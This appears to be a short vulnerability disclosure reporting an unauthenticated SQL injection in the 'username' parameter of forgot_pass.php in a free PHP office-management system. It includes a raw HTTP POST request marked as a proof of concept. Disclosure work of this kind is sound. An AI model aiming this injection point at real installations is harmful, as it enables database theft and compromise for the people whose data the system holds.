

Advocate office management has an SQL injection vulnerability that could be exploited by an attacker to steal information or compromise a database without authentication.





Source code address：https://www.sourcecodester.com/php/17280/advocate-office-management-system-free-download.html



The vulnerability is located in the /control/forgot_pass.php file, you can see that the code is to receive POST request verify, username parameters, and username assigned to $text_email directly into the database for operation, without any restrictions. Cause loophole problem.

![image-20250314122524056](images/image-20250314122524056.png)



Vulnerability verification：

```
POST /office/kortex_lite/control/forgot_pass.php HTTP/1.1
Host: 192.168.80.152
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------29138259241211
Content-Length: 250

-----------------------------29138259241211
Content-Disposition: form-data; name="username"

111
-----------------------------29138259241211
Content-Disposition: form-data; name="verify"

Verify
-----------------------------29138259241211--

```

![image-20250314122643288](images/image-20250314122643288.png)



































